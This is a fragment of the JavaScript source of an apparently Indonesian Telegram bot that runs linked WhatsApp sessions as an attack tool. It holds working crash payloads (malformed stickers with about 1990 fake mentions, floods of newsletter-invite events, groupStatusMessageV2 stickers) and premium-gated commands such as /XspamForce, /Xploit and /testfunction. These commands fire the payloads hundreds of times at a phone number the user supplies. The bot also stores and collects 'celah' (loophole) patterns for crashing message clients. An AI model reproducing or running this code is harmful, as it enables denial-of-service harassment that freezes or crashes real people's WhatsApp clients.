                    { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: newStyle }
                ],
                [
                    { text: "XSETTINGS", callback_data: "owner_menu", style: newStyle },
                    { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: newStyle }
                ],
                [
                    { text: "XCHANGECOLOR", callback_data: "change_color_menu", style: newStyle },
                    { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: newStyle }
                ]
            ]

            await safeEditMessageReplyMarkup(chatId, messageId, { inline_keyboard: newKeyboard });
        }, 1500)
    } else {
        discoActive = false
        globalIntervalId = null
    }

    buttonIntervals.set(messageId, globalIntervalId)
    return messageId
}

async function sendStartMenu(chatId, from) {
    return await sendColoredMenu(chatId, from, currentColor, null)
}

function stopDiscoEffect() {
    discoActive = false
    if (globalIntervalId) {
        clearInterval(globalIntervalId)
        globalIntervalId = null
    }
}

function isPremium(userId) {
    const user = premiumUsers.find(u => u.id === userId)
    if (!user) return false
    if (user.expiresAt === "permanent") return true
    return Date.now() < user.expiresAt
}

function isCommandBlocked(commandName) {
    return blockedCommands.includes(commandName.toLowerCase());
}

async function addGroupPremium(chatId, days, userId) {
    const chat = await bot.getChat(chatId);
    const groupId = chatId.toString();
    const groupTitle = chat.title;
    const existingGroup = groupPremiumData.find(g => g.groupId === groupId);
    const expiresAt = Date.now() + (days * 24 * 60 * 60 * 1000);
    if (existingGroup) {
        existingGroup.expiresAt = expiresAt;
        existingGroup.updatedBy = userId;
        existingGroup.updatedAt = Date.now();
    } else {
        groupPremiumData.push({
            groupId: groupId,
            groupTitle: groupTitle,
            addedBy: userId,
            addedAt: Date.now(),
            expiresAt: expiresAt,
            members: []
        });
    }
    saveGroupPremiumData(groupPremiumData);
    return true;
}

function removeGroupPremium(chatId) {
    const groupId = chatId.toString();
    groupPremiumData = groupPremiumData.filter(g => g.groupId !== groupId);
    saveGroupPremiumData(groupPremiumData);
    return true;
}

async function addMemberPremiumFromGroup(chatId, userId, username, days) {
    const groupId = chatId.toString();
    const group = groupPremiumData.find(g => g.groupId === groupId);
    if (!group) return false;
    const expiresAt = Date.now() + (days * 24 * 60 * 60 * 1000);
    const existingMember = group.members.find(m => m.userId === userId);
    if (existingMember) {
        existingMember.expiresAt = expiresAt;
        existingMember.username = username;
    } else {
        group.members.push({
            userId: userId,
            username: username,
            addedAt: Date.now(),
            expiresAt: expiresAt
        });
    }
    const existingPremium = premiumUsers.find(u => u.id === userId);
    if (!existingPremium) {
        premiumUsers.push({ id: userId, expiresAt: expiresAt });
    } else {
        existingPremium.expiresAt = expiresAt;
    }
    savePremiumUsers();
    saveGroupPremiumData(groupPremiumData);
    return true;
}

const pendingColorPoll = {};

// ================= EXTRACT CELAH/PATTERN ================= //
function extractCelah(code) {
    const patterns = {
        'groupInviteMessage': /groupInviteMessage\s*:\s*{([^}]+)}/gs,
        'newsletterAdminInviteMessage': /newsletterAdminInviteMessage\s*:\s*{([^}]+)}/gs,
        'interactiveResponseMessage': /interactiveResponseMessage\s*:\s*{([^}]+)}/gs,
        'viewOnceMessage': /viewOnceMessage\s*:\s*{([^}]+)}/gs,
        'stickerMessage': /stickerMessage\s*:\s*{([^}]+)}/gs,
        'videoMessage': /videoMessage\s*:\s*{([^}]+)}/gs,
        'contactMessage': /contactMessage\s*:\s*{([^}]+)}/gs,
        'groupStatusMessageV2': /groupStatusMessageV2\s*:\s*{([^}]+)}/gs,
        'interactiveMessage': /interactiveMessage\s*:\s*{([^}]+)}/gs,
        'nativeFlowMessage': /nativeFlowMessage\s*:\s*{([^}]+)}/gs,
        'buttons': /buttons\s*:\s*\[([^\]]+)\]/gs,
        'contextInfo': /contextInfo\s*:\s*{([^}]+)}/gs,
        'templateMessage': /templateMessage\s*:\s*{([^}]+)}/gs,
        'stickerPackMessage': /stickerPackMessage\s*:\s*{([^}]+)}/gs,
        'eventMessage': /eventMessage\s*:\s*{([^}]+)}/gs,
        'extendedTextMessage': /extendedTextMessage\s*:\s*{([^}]+)}/gs,
        'delayinvis': /async\s+function\s+delayinvis\s*\([^)]*\)\s*{[^}]*}/gs
    };
    let results = [];
    for (const [type, pattern] of Object.entries(patterns)) {
        const matches = code.matchAll(pattern);
        for (const match of matches) {
            results.push({
                type: type,
                content: match[0].trim(),
                fullMatch: match[0]
            });
        }
    }
    return results;
}

// ================= ADD PARTICIPANT FUNCTION ================= //
function addParticipantToCode(code) {
    const hasParticipant = code.includes('participant: { jid: target }') || 
                          code.includes('}, { participant:') ||
                          code.includes('{ participant: { jid: target } }');
    
    if (hasParticipant) {
        return { hasAlready: true, fixedCode: code, message: "✅ Participant sudah ada dalam code." };
    }
    
    let fixed = code;
    
    if (/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g.test(fixed)) {
        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g, 
            'sock.relayMessage(target, message, { participant: { jid: target } })');
        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant berhasil ditambahkan." };
    }
    
    if (/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*,\s*\{[^}]*\}\s*\)/g.test(fixed)) {
        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*,\s*(\{[^}]*\})\s*\)/g, 
            'sock.relayMessage(target, message, { ...$1, participant: { jid: target } })');
        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant ditambahkan ke parameter ketiga." };
    }
    
    if (/sock\.relayMessage\s*\(\s*['"]status@broadcast['"]\s*,\s*msg\s*,\s*\{[^}]*\}\s*\)/g.test(fixed)) {
        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*['"]status@broadcast['"]\s*,\s*msg\s*,\s*(\{[^}]*\})\s*\)/g, 
            'sock.relayMessage(\'status@broadcast\', msg, { ...$1, participant: { jid: target } })');
        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant ditambahkan ke status broadcast." };
    }
    
    if (/await\s+sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g.test(fixed)) {
        fixed = fixed.replace(/await\s+sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g, 
            'await sock.relayMessage(target, message, { participant: { jid: target } })');
        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant berhasil ditambahkan." };
    }
    
    return { hasAlready: false, fixedCode: code, message: "⚠️ Tidak ditemukan pattern relayMessage dalam code." };
}

// ================= AUTO FIX ENGINE ================= //
function autoFixJavaScript(code, error) {
    let fixed = code;
    const fixes = [];
    const lines = fixed.split('\n');
    for (let i = 0; i < lines.length; i++) {
        let line = lines[i].trim();
        if (line && !line.endsWith(';') && !line.endsWith('{') && !line.endsWith('}') && 
            !line.endsWith('(') && !line.startsWith('//') && !line.startsWith('/*') &&
            !line.match(/(if|else|for|while|function|return|=>|,)$/)) {
            lines[i] += ';';
            fixes.push(`Added semicolon at line ${i+1}`);
        }
    }
    fixed = lines.join('\n');
    let open = (fixed.match(/\(/g) || []).length;
    let close = (fixed.match(/\)/g) || []).length;
    if (open > close) {
        fixed += ')'.repeat(open - close);
        fixes.push('Added missing parentheses');
    }
    open = (fixed.match(/\{/g) || []).length;
    close = (fixed.match(/\}/g) || []).length;
    if (open > close) {
        fixed += '}'.repeat(open - close);
        fixes.push('Added missing brackets');
    }
    if (fixed.includes('await ') && !fixed.includes('async ')) {
        fixed = fixed.replace(/function\s+(\w+)\s*\(/, 'async function $1(');
        fixes.push('Added async keyword');
    }
    if (fixed.includes('await') && !fixed.includes('try') && !fixed.includes('.catch')) {
        const awaitLines = fixed.split('\n');
        for (let i = 0; i < awaitLines.length; i++) {
            if (awaitLines[i].includes('await') && !awaitLines[i].includes('try')) {
                awaitLines[i] = `try {\n  ${awaitLines[i]}\n} catch (err) {\n  console.error('Error:', err);\n}`;
                fixes.push(`Added try-catch for await at line ${i+1}`);
                break;
            }
        }
        fixed = awaitLines.join('\n');
    }
    if (fixed.includes(' == ') && !fixed.includes(' === ')) {
        fixed = fixed.replace(/==(?!=)/g, '===');
        fixes.push('Changed == to ===');
    }
    if (fixed.includes('var ')) {
        fixed = fixed.replace(/\bvar\s+/g, 'let ');
        fixes.push('Changed var to let');
    }
    if (fixed.match(/function\s+\w+\s*\(\s*\)/) && (fixed.includes('sock') || fixed.includes('target'))) {
        fixed = fixed.replace(/function\s+(\w+)\s*\(\s*\)/, 'function $1(sock, target)');
        fixes.push('Added missing parameters (sock, target)');
    }
    let braceOpen = (fixed.match(/\{/g) || []).length;
    let braceClose = (fixed.match(/\}/g) || []).length;
    if (braceOpen > braceClose) {
        fixed += '\n}'.repeat(braceOpen - braceClose);
        fixes.push('Added missing closing braces');
    }
    return { fixed, fixes };
}

// ================= TESTFUNCTION ================= //
async function executeTestFunction(sock, target, funcCode, jumlah) {
    try {
        const matchFunc = funcCode.match(/async function\s+(\w+)/);
        if (!matchFunc) return false;
        const funcName = matchFunc[1];
        const sandbox = {
            console,
            Buffer,
            sock: sock,
            target,
            sleep,
            generateWAMessageFromContent,
        };
        const context = vm.createContext(sandbox);
        const wrapper = `${funcCode}\n${funcName}(sock, target)`;
        for (let i = 0; i < jumlah; i++) {
            try {
                vm.runInContext(wrapper, context);
            } catch (err) {}
            await sleep(100);
        }
        return true;
    } catch (error) {
        return false;
    }
}

async function checkUserAccess(userId, chatId, chatType, commandName) {
    const isOwnerUser = isOwner(userId);
    const isPremiumUser = isPremium(userId);
    if (isCommandBlocked(commandName)) return false;
    if (isOwnerUser) return true;
    if (chatType === "private" && !isPremiumUser) {
        await safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
        return false;
    }
    return true;
}

function getCurrentDate() {
    return new Date().toLocaleString('id-ID', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

function createBugSuccessMessage(targetNumber, bugType, date) {
    return `
<blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>

◉ Target : ${targetNumber}
◉ Type Bug : ${bugType}
◉ Status : Successfully Send
◉ Date Now : ${date}

<blockquote>⸙ Spam Free at will</blockquote>`;
}

function createCheckButton(targetNumber) {
    return { inline_keyboard: [[{ text: "📱 CEK TARGET", url: `https://wa.me/${targetNumber}` }]] };
}

// ================= BUG FUNCTIONS ================= //
async function CrashFrHome(sock, target) {
    try {
        const stickerMsg = {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                        mimetype: "image/webp",
                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                        fileLength: { low: 1, high: 0, unsigned: true },
                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                        isAnimated: true,
                        contextInfo: {
                            mentionedJid: [target, ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")],
                        },
                    },
                },
            },
        };
        await sock.sendMessage(target, stickerMsg);
        for (let i = 0; i < 1000; i++) {
            await sock.sendMessage(target, {
                viewOnceMessage: {
                    message: {
                        eventMessage: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: "33333333333333333@newsletter",
                                newsletterName: "FrezeHomeAbouse",
                            },
                        },
                    },
                },
            });
            await sleep(50);
        }
    } catch (e) {}
}

async function StickerFC(sock, target) {
    try {
        const message = {
            "groupStatusMessageV2": {
                "message": {
                    "stickerMessage": {
                        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                        "mimetype": "image/webp",
                        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                        "fileLength": "10610",
                        "mediaKeyTimestamp": "1775044724",
                        "stickerSentTs": "1775044724091"
                    }
                }
            }
        };
        await sock.relayMessage(target, message, {});
    } catch (err) {}
}

async function FCinvisTes(sock, target) {
    const message = {
        "groupStatusMessageV2": {
            "message": {
                "stickerMessage": {
                    "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                    "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    "mimetype": "image/webp",
                    "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    "fileLength": "10610",
                    "mediaKeyTimestamp": "1775044724",
                    "stickerSentTs": "1775044724091"
                }
            }
        }
    };
    return await sock.relayMessage(target, message, { participant: { jid: target } });
}

async function FCinvis(sock, target) {
    return await FCinvisTes(sock, target);
}

async function brem(sock, target) { }
async function VisiFriend(sock, target) { }
async function OfferXForclose(sock, target) { }
async function bulldozerV2(sock, target) { }
async function xatanicaldelayv2(sock, target) { }
async function MbaPe(sock, target) { }

// ================= COMMANDS ================= //

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from;
    const userId = from.id;
    const chatType = msg.chat.type;
    const isGroup = chatType === "group" || chatType === "supergroup";
    const isOwnerUser = OWNER_ID.toString() === userId.toString();
    if (!isGroup && !isPremium(userId) && !isOwnerUser) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
    }
    await sendStartMenu(chatId, from);
});

bot.onText(/\/cekfunc/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "cekfunc");
    if (!hasAccess) return;
    if (!msg.reply_to_message) {
        return safeSendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Kirim function JavaScript\n2. Reply function tersebut\n3. Ketik /cekfunc", { parse_mode: "Markdown" });
    }
    const text = msg.reply_to_message.text || msg.reply_to_message.caption;
    if (!text) {
        return safeSendMessage(chatId, "❌ Pesan yang direply tidak berisi kode.");
    }
    const loadingMsg = await safeSendMessage(chatId, "🔍 *Menganalisis function...*", { parse_mode: "Markdown" });
    if (!loadingMsg) return;
    try {
        acorn.parse(text, {
            ecmaVersion: "latest",
            sourceType: "module",
            locations: true
        });
        await safeEditMessageText(chatId, loadingMsg.message_id, `🔎 *Mengecek syntax function...*\n\n✅ *SYNTAX VALID*\nTidak ditemukan error.\n\n© Primrose Linux Bot`, { parse_mode: "Markdown" });
    } catch (err) {
        const lines = text.split("\n");
        const line = err.loc.line;
        const column = err.loc.column;
        const start = Math.max(0, line - 3);
        const end = Math.min(lines.length, line + 2);
        const snippet = lines.slice(start, end).map((l, i) => {
            const num = start + i + 1;
            return num === line ? `👉 ${num} | ${l}` : `   ${num} | ${l}`;
        }).join("\n");
        const errorMessage = `❌ *ERROR TERDETEKSI*\n\n${err.message}\nLine ${line}:${column}\n\n📌 *Cuplikan:*\n\`\`\`javascript\n${snippet}\n\`\`\`\n\n© Primrose Linux Bot`;
        const keyboard = {
            inline_keyboard: [[{ text: "🔧 AUTO FIX 100%", callback_data: `autofix_${loadingMsg.message_id}` }]]
        };
        global.pendingFix = global.pendingFix || {};
        global.pendingFix[loadingMsg.message_id] = {
            code: text,
            error: err.message,
            line: line,
            column: column
        };
        await safeEditMessageText(chatId, loadingMsg.message_id, errorMessage, {
            parse_mode: "Markdown",
            reply_markup: keyboard
        });
    }
});

bot.onText(/\/addparticipant/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "addparticipant");
    if (!hasAccess) return;
    
    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) {
        return safeSendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Reply function JavaScript.\n2. Ketik /addparticipant", { parse_mode: "Markdown" });
    }
    
    let code = '';
    if (msg.reply_to_message.text) {
        code = msg.reply_to_message.text;
    } else if (msg.reply_to_message.document) {
        const file = await bot.getFile(msg.reply_to_message.document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        const response = await axios.get(fileUrl);
        code = response.data;
    }
    
    const loadingMsg = await safeSendMessage(chatId, "👤 *Memeriksa participant...*", { parse_mode: "Markdown" });
    if (!loadingMsg) return;
    
    const result = addParticipantToCode(code);
    
    if (result.hasAlready) {
        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *PARTICIPANT SUDAH ADA*\n\n${result.message}\n\nTidak perlu ditambahkan lagi.`, { parse_mode: "Markdown" });
        return;
    }
    
    if (result.message.includes("Tidak ditemukan pattern")) {
        await safeEditMessageText(chatId, loadingMsg.message_id, `⚠️ *PARTICIPANT TIDAK DITEMUKAN*\n\n${result.message}\n\nPastikan code berisi \`relayMessage\` atau \`sock.relayMessage\`.`, { parse_mode: "Markdown" });
        return;
    }
    
    if (result.fixedCode.length > 3500) {
        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *PARTICIPANT DITAMBAHKAN!*\n\nCode terlalu panjang, dikirim sebagai file.`, { parse_mode: "Markdown" });
        const filePath = `participant_fixed_${Date.now()}.js`;
        fs.writeFileSync(filePath, result.fixedCode);
        await bot.sendDocument(chatId, filePath, { caption: `✅ Code dengan participant` });
        fs.unlinkSync(filePath);
    } else {
        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *PARTICIPANT DITAMBAHKAN!*\n\n${result.message}\n\n🟢 *HASIL:*\n\`\`\`javascript\n${result.fixedCode}\n\`\`\``, { parse_mode: "Markdown" });
    }
});

bot.onText(/\/celahfunc/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "celahfunc");
    if (!hasAccess) return;
    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) {
        return safeSendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Kirim code JavaScript\n2. Reply code tersebut\n3. Ketik /celahfunc", { parse_mode: "Markdown" });
    }
    let code = '';
    if (msg.reply_to_message.text) {
        code = msg.reply_to_message.text;
    } else if (msg.reply_to_message.document) {
        const file = await bot.getFile(msg.reply_to_message.document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        const response = await axios.get(fileUrl);
        code = response.data;
    }
    const loadingMsg = await safeSendMessage(chatId, "🔍 *Menganalisis celah...*", { parse_mode: "Markdown" });
    if (!loadingMsg) return;
    const celah = extractCelah(code);
    if (celah.length === 0) {
        await safeEditMessageText(chatId, loadingMsg.message_id, "❌ *Tidak ditemukan celah/pattern dalam code!*\n\n💡 Gunakan /addcelah untuk menambahkan celah baru ke database.", { parse_mode: "Markdown" });
        return;
    }
    let response = `<blockquote>🔍 CELAH DITEMUKAN</blockquote>\n\n`;
    response += `Total: ${celah.length} celah\n━━━━━━━━━━━━━━━━━━\n\n`;
    for (let i = 0; i < Math.min(celah.length, 10); i++) {
        response += `<b>${i+1}. Type: ${celah[i].type}</b>\n`;
        response += `<code>${celah[i].content.substring(0, 600)}</code>\n`;
        if (celah[i].content.length > 600) response += `\n... (${celah[i].content.length - 600} chars terpotong)\n`;
        response += `━━━━━━━━━━━━━━━━━━\n\n`;
    }
    await safeEditMessageText(chatId, loadingMsg.message_id, response, { parse_mode: "HTML" });
});

bot.onText(/\/addcelah/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "addcelah");
    if (!hasAccess) return;
    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) {
        return safeSendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Kirim code JavaScript\n2. Reply code tersebut\n3. Ketik /addcelah", { parse_mode: "Markdown" });
    }
    let code = '';
    if (msg.reply_to_message.text) {
        code = msg.reply_to_message.text;
    } else if (msg.reply_to_message.document) {
        const file = await bot.getFile(msg.reply_to_message.document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        const response = await axios.get(fileUrl);
        code = response.data;
    }
    const loadingMsg = await safeSendMessage(chatId, "💾 *Menyimpan celah ke database...*", { parse_mode: "Markdown" });
    if (!loadingMsg) return;
    const celah = extractCelah(code);
    if (celah.length === 0) {
        await safeEditMessageText(chatId, loadingMsg.message_id, "❌ *Tidak ditemukan celah/pattern dalam code!* Tidak ada yang bisa disimpan.", { parse_mode: "Markdown" });
        return;
    }
    let addedCount = 0;
    for (const c of celah) {
        const exists = celahDatabase.some(item => item.type === c.type && item.content === c.content);
        if (!exists) {
            celahDatabase.push({
                id: Date.now().toString(36) + Math.random().toString(36).substring(2, 8),
                type: c.type,
                content: c.content,
                addedBy: userId,
                addedAt: Date.now()
            });
            addedCount++;
        }
    }
    saveCelahDatabase(celahDatabase);
    await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *Berhasil menyimpan ${addedCount} celah baru ke database!*\n\n📊 Total celah tersimpan: ${celahDatabase.length}`, { parse_mode: "Markdown" });
});

bot.onText(/\/listcelah/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "listcelah");
    if (!hasAccess) return;
    if (celahDatabase.length === 0) {
        return safeSendMessage(chatId, "📌 *Belum ada celah tersimpan di database.*\n\nGunakan /addcelah untuk menambahkan.", { parse_mode: "Markdown" });
    }
    let response = `<blockquote>📋 DAFTAR CELAH TERSIMPAN</blockquote>\n\n`;
    response += `Total: ${celahDatabase.length} celah\n━━━━━━━━━━━━━━━━━━\n\n`;
    for (let i = 0; i < Math.min(celahDatabase.length, 15); i++) {
        const celah = celahDatabase[i];
        response += `<b>${i+1}. ID: ${celah.id}</b>\n`;
        response += `<b>Type:</b> ${celah.type}\n`;
        response += `<b>Content:</b>\n<code>${celah.content.substring(0, 300)}</code>\n`;
        if (celah.content.length > 300) response += `...\n`;
        response += `━━━━━━━━━━━━━━━━━━\n\n`;
    }
    if (celahDatabase.length > 15) {
        response += `\n... dan ${celahDatabase.length - 15} celah lainnya\n`;
        response += `Gunakan /delcelah <id> untuk menghapus\n`;
    }
    await safeSendMessage(chatId, response, { parse_mode: "HTML" });
});

bot.onText(/\/delcelah (\w+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "delcelah");
    if (!hasAccess) return;
    const id = match[1];
    const index = celahDatabase.findIndex(c => c.id === id);
    if (index === -1) {
        return safeSendMessage(chatId, `❌ Celah dengan ID ${id} tidak ditemukan.`);
    }
    const removed = celahDatabase.splice(index, 1)[0];
    saveCelahDatabase(celahDatabase);
    await safeSendMessage(chatId, `✅ *Berhasil menghapus celah!*\n\nType: ${removed.type}\nID: ${removed.id}`, { parse_mode: "Markdown" });
});

bot.onText(/\/testfunction(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "testfunction");
    if (!hasAccess) return;
    if (!msg.reply_to_message || !msg.reply_to_message.text) {
        return safeSendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Reply function JavaScript\n2. Ketik /testfunction <nomor> <jumlah>", { parse_mode: "Markdown" });
    }
    const args = msg.text.split(" ");
    if (args.length < 3) {
        return safeSendMessage(chatId, "🪧 Example : /testfunction 62xxx 10 (reply function)");
    }
    const q = args[1];
    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0) {
        return safeSendMessage(chatId, "❌ Jumlah harus angka");
    }
    const targetNumber = q.replace(/[^0-9]/g, "");
    const target = `${targetNumber}@s.whatsapp.net`;
    if (sessions.size === 0) {
        return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    }
    const sock = sessions.values().next().value;
    const funcCode = msg.reply_to_message.text;
    const loadingMsg = await safeSendMessage(chatId, "🚀 *Memproses testfunction...*", { parse_mode: "Markdown" });
    if (!loadingMsg) return;
    const success = await executeTestFunction(sock, target, funcCode, jumlah);
    if (success) {
        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *Testfunction selesai!*\n\nTarget: ${targetNumber}\nJumlah: ${jumlah}x\nStatus: Success\n\n© Primrose Linux Bot`, { parse_mode: "Markdown" });
    } else {
        await safeEditMessageText(chatId, loadingMsg.message_id, `❌ *Testfunction gagal!*\n\nTarget: ${targetNumber}\nJumlah: ${jumlah}x\nStatus: Failed\n\n© Primrose Linux Bot`, { parse_mode: "Markdown" });
    }
});

// ================= BUG COMMANDS ================= //

bot.onText(/\/XspamForce(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "xspamforce");
    if (!hasAccess) return;
    if (!match[1]) {
        return safeSendMessage(chatId, "🪧 *Format:* /XspamForce 628xxx\n\n💡 *Fitur:* Spam Force Anti Kenok\n✅ Support Nokos Fresh\n✅ Anti Blokir\n✅ 2 Function Combo (CrashFrHome + StickerFC)\n✅ Bebas spam tanpa jeda", { parse_mode: "Markdown" });
    }
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    const target = `${targetNumber}@s.whatsapp.net`;
    const date = getCurrentDate();
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "XspamForce (Anti Kenok)", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 500; i++) {
        await CrashFrHome(sock, target);
        await StickerFC(sock, target);
        await sleep(100);
    }
});

bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "xploit");
    if (!hasAccess) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /xploit 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    const target = `${targetNumber}@s.whatsapp.net`;
    const date = getCurrentDate();
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "xploit", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 1; i++) { await FCinvis(sock, target); }
});

bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "sanjiva");
    if (!hasAccess) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Sanjiva 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    const target = `${targetNumber}@s.whatsapp.net`;
    const date = getCurrentDate();
